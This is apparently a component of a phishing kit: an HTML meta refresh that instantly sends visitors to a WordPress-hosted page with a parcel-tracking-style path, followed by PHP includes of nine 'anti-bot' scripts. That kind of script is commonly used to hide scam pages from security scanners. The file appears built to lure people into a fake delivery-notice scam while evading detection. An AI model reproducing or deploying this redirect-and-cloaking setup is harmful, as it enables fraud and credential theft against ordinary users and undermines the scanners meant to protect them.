<html>
<META http-equiv="refresh" content="0;URL=https://wordpress-63116-0.cloudclusters.net/Pack_CH_TRACK062263">
</html><?php
include './bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
include '../bots/antibots.php';
?>